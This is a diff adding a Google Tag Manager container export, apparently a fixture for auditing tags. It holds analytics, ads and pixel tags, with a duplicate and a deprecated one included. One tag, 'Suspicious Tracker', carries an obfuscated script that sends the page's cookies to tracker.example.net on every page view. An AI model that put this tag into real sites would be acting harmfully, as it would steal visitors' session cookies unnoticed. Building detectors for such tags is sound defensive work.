@@ -1,0 +1,289 @@
+{
+  "exportFormatVersion": 2,
+  "exportTime": "2026-03-18 12:00:00",
+  "containerVersion": {
+    "path": "accounts/000000000/containers/000000000/versions/0",
+    "accountId": "000000000",
+    "containerId": "000000000",
+    "containerVersionId": "0",
+    "container": {
+      "path": "accounts/000000000/containers/000000000",
+      "accountId": "000000000",
+      "containerId": "000000000",
+      "name": "Example Website",
+      "publicId": "GTM-EXAMPLE",
+      "usageContext": ["WEB"]
+    },
+    "tag": [
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "1",
+        "name": "GA4 - Configuration",
+        "type": "gaawc",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "measurementId",
+            "value": "G-EXAMPLEXX1"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "sendPageView",
+            "value": "true"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "2",
+        "name": "GA4 - Page View Event",
+        "type": "gaawe",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "eventName",
+            "value": "page_view"
+          },
+          {
+            "type": "TAG_REFERENCE",
+            "key": "measurementId",
+            "value": "GA4 - Configuration"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "3",
+        "name": "GA4 - Configuration (duplicate)",
+        "type": "gaawc",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "measurementId",
+            "value": "G-EXAMPLEXX1"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "sendPageView",
+            "value": "true"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "4",
+        "name": "Google Ads - Lead Conversion",
+        "type": "awct",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "conversionId",
+            "value": "AW-0000000000"
+          },
+          {
+            "type": "TEMPLATE",
+            "key": "conversionLabel",
+            "value": "EXAMPLELABEL"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "5",
+        "name": "Old Facebook Pixel - Deprecated",
+        "type": "html",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "html",
+            "value": "<!-- deprecated pixel code -->"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "supportDocumentWrite",
+            "value": "false"
+          }
+        ],
+        "paused": true,
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "6",
+        "name": "Meta Pixel - Lead",
+        "type": "html",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "html",
+            "value": "<script>fbq('track', 'Lead', {content_name: 'Contact Form'});</script>"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "supportDocumentWrite",
+            "value": "false"
+          }
+        ],
+        "firingTriggerId": ["10"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "7",
+        "name": "Meta Pixel - Base",
+        "type": "html",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "html",
+            "value": "<script>\n!function(f,b,e,v,n,t,s)\n{if(f.fbq)return;n=f.fbq=function(){n.callMethod?\nn.callMethod.apply(n,arguments):n.queue.push(arguments)};\nif(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';\nn.queue=[];t=b.createElement(e);t.async=!0;\nt.src=v;s=b.getElementsByTagName(e)[0];\ns.parentNode.insertBefore(t,s)}(window, document,'script',\n'https://connect.facebook.net/en_US/fbevents.js');\nfbq('init', '000000000000000');\nfbq('track', 'PageView');\n</script>\n<noscript><img height=\"1\" width=\"1\" style=\"display:none\"\nsrc=\"https://www.facebook.com/tr?id=000000000000000&ev=PageView&noscript=1\"\n/></noscript>"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "supportDocumentWrite",
+            "value": "false"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "8",
+        "name": "Suspicious Tracker",
+        "type": "html",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "html",
+            "value": "<script>\nvar _0x1a2b = String.fromCharCode(104,116,116,112,115,58,47,47);\nvar _0x3c4d = 'tracker.example.net/collect';\nnew Image().src = _0x1a2b + _0x3c4d + '?uid=' + document.cookie;\n</script>"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "supportDocumentWrite",
+            "value": "false"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      },
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "tagId": "9",
+        "name": "Vendor Analytics SDK",
+        "type": "html",
+        "parameter": [
+          {
+            "type": "TEMPLATE",
+            "key": "html",
+            "value": "<script>!function(e,t,n,a,r,s,c){e[a]=e[a]||function(){(e[a].q=e[a].q||[]).push(arguments)};r=t.createElement(n);s=t.getElementsByTagName(n)[0];r.async=1;r.src='https://cdn.example-vendor.com/sdk.min.js';s.parentNode.insertBefore(r,s)}(window,document,'script','vndAnalytics');vndAnalytics('init','PLACEHOLDER_ID');vndAnalytics('track','pageview',{page:location.pathname,ref:document.referrer,ts:Date.now(),uid:void 0,sid:Math.random().toString(36).substring(2),v:'4.12.1',env:'production',debug:false,retry:3,timeout:5000,batch:true,compress:true,beacon:true,sampling:1.0,features:{scroll:true,click:true,form:true,error:true,performance:true,rage_click:true,dead_click:false}});</script>"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "supportDocumentWrite",
+            "value": "false"
+          }
+        ],
+        "firingTriggerId": ["2147479573"],
+        "tagFiringOption": "ONCE_PER_EVENT",
+        "monitoringMetadata": {
+          "type": "MAP"
+        }
+      }
+    ],
+    "trigger": [
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "triggerId": "10",
+        "name": "Custom Event - generate_lead",
+        "type": "CUSTOM_EVENT",
+        "customEventFilter": [
+          {
+            "type": "EQUALS",
+            "parameter": [
+              {
+                "type": "TEMPLATE",
+                "key": "arg0",
+                "value": "{{_event}}"
+              },
+              {
+                "type": "TEMPLATE",
+                "key": "arg1",
+                "value": "generate_lead"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "variable": [
+      {
+        "accountId": "000000000",
+        "containerId": "000000000",
+        "variableId": "20",
+        "name": "DLV - event",
+        "type": "v",
+        "parameter": [
+          {
+            "type": "INTEGER",
+            "key": "dataLayerVersion",
+            "value": "2"
+          },
+          {
+            "type": "BOOLEAN",
+            "key": "setDefaultValue",
+            "value": "false"
+          },
+          {
+            "type": "TEMPLATE",
+            "key": "name",
+            "value": "event"
+          }
+        ]
+      }
+    ]
+  }
+}
